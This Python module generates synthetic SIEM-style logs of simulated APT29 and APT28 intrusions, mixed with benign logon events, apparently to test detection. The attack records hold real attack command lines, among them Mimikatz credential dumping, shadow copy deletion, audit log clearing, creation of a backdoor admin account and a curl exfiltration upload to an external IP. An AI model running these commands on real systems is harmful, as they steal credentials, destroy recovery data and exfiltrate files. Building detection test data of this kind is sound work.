import json
import random
from datetime import datetime, timedelta
from pathlib import Path

from config.settings import RAW_LOGS_DIR


class APTLogGenerator:
    """
    Advanced Persistent Threat (APT) Log Generator.
    Simulates complex, multi-stage APT attack campaigns (APT29 Cozy Bear & APT28 Fancy Bear)
    spanning initial access, privilege escalation, credential dumping, lateral movement,
    defense evasion, and data exfiltration.
    """

    def __init__(self):
        self.output_file = RAW_LOGS_DIR / "apt_attack_logs.json"

    def generate_apt_dataset(self) -> Path:
        raw_events = []
        base_time = datetime.now() - timedelta(hours=2)

        # -------------------------------------------------------------
        # APT CAMPAIGN 1: APT29 (Cozy Bear) - Enterprise Domain Takeover
        # Stage 1: Spearphishing & Obfuscated PowerShell execution
        # Stage 2: Kerberoasting & Privilege Escalation
        # Stage 3: LSASS Memory Dumping (Mimikatz)
        # Stage 4: WMI Lateral Movement to Domain Controller
        # Stage 5: Shadow Copy Deletion & C2 Data Exfiltration
        # -------------------------------------------------------------
        apt29_timeline = [
            # Stage 1: Spearphishing Payload Execution
            {
                "timestamp": (base_time + timedelta(minutes=2)).isoformat(),
                "source": "Sysmon",
                "event_id": 1,
                "hostname": "FINANCE-WORKSTATION",
                "user": "corp\\jdoe",
                "source_ip": "10.0.4.15",
                "destination_ip": "185.220.101.5",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -NoP -Enc QnkgUGFzcyBPdMVy...",
                "message": "APT29 Initial Access: Obfuscated PowerShell payload executed via weaponized document attachment.",
                "apt_campaign": "APT29 (Cozy Bear)"
            },
            # Stage 2: Kerberoasting Ticket Request
            {
                "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
                "source": "Windows Security",
                "event_id": 4769,
                "hostname": "FINANCE-WORKSTATION",
                "user": "corp\\jdoe",
                "source_ip": "10.0.4.15",
                "destination_ip": "10.0.0.1",
                "process_name": "lsass.exe",
                "command_line": "N/A",
                "message": "APT29 Credential Access: Kerberos TGS requested for SPN krbtgt with RC4 encryption (Kerberoasting).",
                "apt_campaign": "APT29 (Cozy Bear)"
            },
            # Stage 3: LSASS Memory Dump (Mimikatz)
            {
                "timestamp": (base_time + timedelta(minutes=10)).isoformat(),
                "source": "Sysmon",
                "event_id": 10,
                "hostname": "FINANCE-WORKSTATION",
                "user": "corp\\jdoe",
                "source_ip": "10.0.4.15",
                "destination_ip": "N/A",
                "process_name": "mimikatz.exe",
                "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                "message": "APT29 Credential Access: Process memory access to LSASS.exe detected for domain credential extraction.",
                "apt_campaign": "APT29 (Cozy Bear)"
            },
            # Stage 4: Lateral Movement via Remote WMI Execution
            {
                "timestamp": (base_time + timedelta(minutes=18)).isoformat(),
                "source": "Suricata IDS",
                "event_id": 2000001,
                "hostname": "DC-PRIMARY",
                "user": "corp\\Administrator",
                "source_ip": "10.0.4.15",
                "destination_ip": "10.0.0.1",
                "process_name": "wmic.exe",
                "command_line": "wmic.exe /node:10.0.0.1 process call create 'powershell.exe -e ...'",
                "message": "APT29 Lateral Movement: Remote WMI execution initiated from FINANCE-WORKSTATION targeting DC-PRIMARY.",
                "apt_campaign": "APT29 (Cozy Bear)"
            },
            # Stage 5: Defense Evasion & Shadow Copy Deletion
            {
                "timestamp": (base_time + timedelta(minutes=25)).isoformat(),
                "source": "Windows Security",
                "event_id": 4688,
                "hostname": "DC-PRIMARY",
                "user": "corp\\Administrator",
                "source_ip": "10.0.4.15",
                "destination_ip": "N/A",
                "process_name": "vssadmin.exe",
                "command_line": "vssadmin.exe delete shadows /all /quiet",
                "message": "APT29 Impact: Volume Shadow Copies deleted on Domain Controller prior to extortion payload execution.",
                "apt_campaign": "APT29 (Cozy Bear)"
            },
            # Stage 6: Audit Log Clearing
            {
                "timestamp": (base_time + timedelta(minutes=28)).isoformat(),
                "source": "Windows Security",
                "event_id": 1102,
                "hostname": "DC-PRIMARY",
                "user": "corp\\Administrator",
                "source_ip": "10.0.4.15",
                "destination_ip": "N/A",
                "process_name": "wevtutil.exe",
                "command_line": "wevtutil cl Security",
                "message": "APT29 Defense Evasion: Windows Security Audit Log cleared to eradicate forensic evidence.",
                "apt_campaign": "APT29 (Cozy Bear)"
            }
        ]

        raw_events.extend(apt29_timeline)

        # -------------------------------------------------------------
        # APT CAMPAIGN 2: APT28 (Fancy Bear) - Stealth Credential Spraying
        # Stage 1: Linux SSH Password Spraying from Untrusted IP
        # Stage 2: Backdoor User Account Creation
        # Stage 3: Outbound C2 Data Exfiltration
        # -------------------------------------------------------------
        apt28_timeline = [
            {
                "timestamp": (base_time + timedelta(minutes=30)).isoformat(),
                "source": "Linux Auth",
                "event_id": 1001,
                "hostname": "SRV-FILE-01",
                "user": "root",
                "source_ip": "45.33.32.156",
                "destination_ip": "10.0.2.20",
                "process_name": "sshd",
                "command_line": "N/A",
                "message": "APT28 Password Spraying: Failed SSH authentication attempt for user root from external threat IP 45.33.32.156.",
                "apt_campaign": "APT28 (Fancy Bear)"
            },
            {
                "timestamp": (base_time + timedelta(minutes=31)).isoformat(),
                "source": "Linux Auth",
                "event_id": 1001,
                "hostname": "SRV-FILE-01",
                "user": "root",
                "source_ip": "45.33.32.156",
                "destination_ip": "10.0.2.20",
                "process_name": "sshd",
                "command_line": "N/A",
                "message": "APT28 Password Spraying: Failed SSH authentication attempt for user root from external threat IP 45.33.32.156.",
                "apt_campaign": "APT28 (Fancy Bear)"
            },
            {
                "timestamp": (base_time + timedelta(minutes=35)).isoformat(),
                "source": "Windows Security",
                "event_id": 4720,
                "hostname": "SRV-FILE-01",
                "user": "backdoor_admin",
                "source_ip": "45.33.32.156",
                "destination_ip": "10.0.2.20",
                "process_name": "net.exe",
                "command_line": "net user backdoor_admin Password123! /add && net localgroup Administrators backdoor_admin /add",
                "message": "APT28 Persistence: Local backdoor administrator account created.",
                "apt_campaign": "APT28 (Fancy Bear)"
            },
            {
                "timestamp": (base_time + timedelta(minutes=40)).isoformat(),
                "source": "Sysmon",
                "event_id": 3,
                "hostname": "SRV-FILE-01",
                "user": "backdoor_admin",
                "source_ip": "10.0.2.20",
                "destination_ip": "45.33.32.156",
                "process_name": "curl.exe",
                "command_line": "curl -F file=@confidential_db.bak http://45.33.32.156/upload",
                "message": "APT28 Exfiltration: Encrypted database backup file exfiltrated to external Command and Control server.",
                "apt_campaign": "APT28 (Fancy Bear)"
            }
        ]

        raw_events.extend(apt28_timeline)

        # Background benign telemetry
        for _ in range(350):
            event_time = base_time + timedelta(seconds=random.randint(10, 7200))
            raw_events.append({
                "timestamp": event_time.isoformat(),
                "source": "Windows Security",
                "event_id": 4624,
                "hostname": random.choice(["FINANCE-WORKSTATION", "HR-DESKTOP-02", "DEV-WORKSTATION"]),
                "user": f"corp\\user_{random.randint(1, 15)}",
                "source_ip": f"10.0.4.{random.randint(20, 150)}",
                "destination_ip": "10.0.0.1",
                "process_name": "svchost.exe",
                "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
                "message": "Benign Windows User Successful Logon.",
                "apt_campaign": "None (Benign Traffic)"
            })

        # Tag all API simulation attack scenario events while preserving original log channel
        for item in raw_events:
            item["log_channel"] = item.get("source", "Windows Security")
            item["source"] = "api_simulation"

        # Shuffle events chronologically
        raw_events.sort(key=lambda x: x["timestamp"])

        from config.settings import LOG_FILE_PATH
        with open(LOG_FILE_PATH, "w", encoding="utf-8") as f:
            json.dump(raw_events, f, indent=2)

        print(f"[INFO] APT Log Generator created {len(raw_events)} logs for APT29 & APT28 scenarios at {self.output_file} and {LOG_FILE_PATH}")
        return self.output_file


def generate_apt_attack_logs() -> Path:
    generator = APTLogGenerator()
    return generator.generate_apt_dataset()


if __name__ == "__main__":
    generate_apt_attack_logs()
